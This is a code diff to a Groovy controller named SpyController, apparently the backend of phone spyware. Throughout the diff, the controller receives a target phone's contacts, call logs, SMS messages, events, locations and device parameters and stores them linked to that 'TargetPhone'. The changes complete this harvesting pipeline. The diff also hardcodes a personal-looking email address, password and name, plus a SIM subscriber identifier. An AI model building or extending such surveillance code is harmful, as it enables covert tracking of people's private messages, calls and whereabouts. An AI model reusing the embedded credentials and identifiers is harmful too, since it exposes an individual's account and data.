@@ -9,12 +9,14 @@ import org.codehaus.jackson.type.TypeReference
 
 import redis.clients.jedis.Jedis
 
-import com.org.krams.domain.CallLog
-import com.org.krams.domain.Contact
-import com.org.krams.domain.Location
-import com.org.krams.domain.PhoneParams
-import com.org.krams.domain.Sms
 import com.org.krams.domain.UMetaData
+import com.xaviar.domain.CallLog
+import com.xaviar.domain.Contact
+import com.xaviar.domain.Location
+import com.xaviar.domain.PhoneParams
+import com.xaviar.domain.Sms
+import com.xaviar.domain.TargetPhone
+import com.xaviar.domain.User
 import com.xaviar.market.rest.item.DataHolder
 
 class SpyController {
@@ -37,12 +39,12 @@ class SpyController {
 		//dataHolder.data = '{"username":"username123","password":"password123","simSubscriberId":"3453453444"}';
 
 		// old user
-		dataHolder.data = '{"token":"token123","simSubscriberId":"simSubscriberId123"}';
+		dataHolder.data = '{"token":"token123","simSubscriberId":"425071021121744"}';
 
-		String clientContacts;// = dataHolder.get(DataHolder.CONTACTS);
+		String clientContacts = dataHolder.get(DataHolder.CONTACTS);
 		String clientLocation = dataHolder.get(DataHolder.LOCATION);
 		String clientSms = dataHolder.get(DataHolder.SMS);
-		String clientCallLog = dataHolder.get(DataHolder.CONTACTS);//CALL_LOG);
+		String clientCallLog = dataHolder.get(DataHolder.CALL_LOG);
 		String clientPhoneEvent = dataHolder.get(DataHolder.PHONE_EVENT);
 		String clientPhoneParams = dataHolder.get(DataHolder.PHONE_PARAMS);
 		String clientSmsEvent = dataHolder.get(DataHolder.SMS_EVENT);
@@ -63,54 +65,101 @@ class SpyController {
 				UMetaData uMetaData = mapper.readValue(dataHolder.data,UMetaData.class);
 
 				if(userService.authenticateUser(uMetaData)){
+					if (clientPhoneParams != null) {
+						mapper = new ObjectMapper();
+						List<PhoneParams> phoneParams = mapper.readValue(clientPhoneParams,new TypeReference<List<PhoneParams>>() {
+								});
+						//PhoneParams.saveAll(phoneParams);
+						//phoneParamsService.createAll(phoneParams,uMetaData);
+
+						List<TargetPhone> targetPhones = mapper.readValue(clientPhoneParams,new TypeReference<List<TargetPhone>>() {
+								});
+
+						User user = new User();
+						user.setUsername("eitan2007@gmail.com");
+						user.setPassword("567567");
+						user.setFirstName("eitan");
+						user.setLastName("baron");
+						user.version=1;
+						user.save();
+
+						def existingUser = User.findByUsernameAndPassword("eitan2007@gmail.com","567567");
+						//TargetPhone.saveAll(phoneParams);
+						//TargetPhone.findBy (user).saveAll(phoneParams);
+						targetPhones.each{
+							it.user=existingUser;
+							it.save();
+						}
+
+					}
+
+
+					TargetPhone  targetPhone = TargetPhone.findBySimSubscriberId(uMetaData.getSimSubscriberId());
+
 					if (clientContacts != null) {
 						mapper = new ObjectMapper();
 						List<Contact> contacts = mapper.readValue(clientContacts,new TypeReference<List<Contact>>() {
 								});
-						contactService.createAll(contacts,uMetaData);
+						contacts.each{
+							it.targetPhone=targetPhone;
+							it.save();
+						}
+
+						//Contact.saveAll(contacts);
+						//contactService.createAll(contacts,uMetaData);
 					}
 
 					if (clientCallLog != null) {
 						mapper = new ObjectMapper();
 						List<CallLog> callLogs = mapper.readValue(clientCallLog,new TypeReference<List<CallLog>>() {
 								});
-						callLogService.createAll(callLogs,uMetaData);
+
+						callLogs.each{ it.targetPhone=targetPhone;	it.save();						 }
+						//CallLog.saveAll(callLogs);
+						//callLogService.createAll(callLogs,uMetaData);
 					}
 
 					if (clientPhoneEvent != null) {
 						mapper = new ObjectMapper();
 						List<CallLog> phoneEvents = mapper.readValue(clientPhoneEvent,new TypeReference<List<CallLog>>() {
 								});
-						phoneEventService.createAll(phoneEvents,uMetaData);
+						phoneEvents.each{ it.targetPhone=targetPhone;it.save(); }
+
+						//CallLog.saveAll(phoneEvents);
+						//phoneEventService.createAll(phoneEvents,uMetaData);
 					}
 
 					if (clientLocation != null) {
 						mapper = new ObjectMapper();
 						List<Location> locations = mapper.readValue(clientLocation,new TypeReference<List<Location>>() {
 								});
-						locationService.createAll(locations,uMetaData);
+						locations.each{ it.targetPhone=targetPhone; it.save();}
+						//Location.saveAll(locations);
+						//locationService.createAll(locations,uMetaData);
 					}
 
 					if (clientSms != null) {
 						mapper = new ObjectMapper();
 						List<Sms> smses = mapper.readValue(clientSms,new TypeReference<List<Sms>>() {
 								});
-						smsService.createAll(smses,uMetaData);
+
+						smses.each{
+							it.targetPhone=targetPhone;
+							it.save();
+						}
+						//Sms.saveAll(smses);
+						//smsService.createAll(smses,uMetaData);
 					}
 
 					if (clientSmsEvent != null) {
 						mapper = new ObjectMapper();
 						List<Sms> smsEvents = mapper.readValue(clientSmsEvent,new TypeReference<List<Sms>>() {
 								});
-						smsEventService.createAll(smsEvents,uMetaData);
+						smsEvents.each{ it.targetPhone=targetPhone;it.save(); }
+						//Sms.saveAll(smsEvents);
+						//smsEventService.createAll(smsEvents,uMetaData);
 					}
 
-					if (clientPhoneParams != null) {
-						mapper = new ObjectMapper();
-						List<PhoneParams> phoneParams = mapper.readValue(clientPhoneParams,new TypeReference<List<PhoneParams>>() {
-								});
-						phoneParamsService.createAll(phoneParams,uMetaData);
-					}
 				}
 
 				final int id = 12;
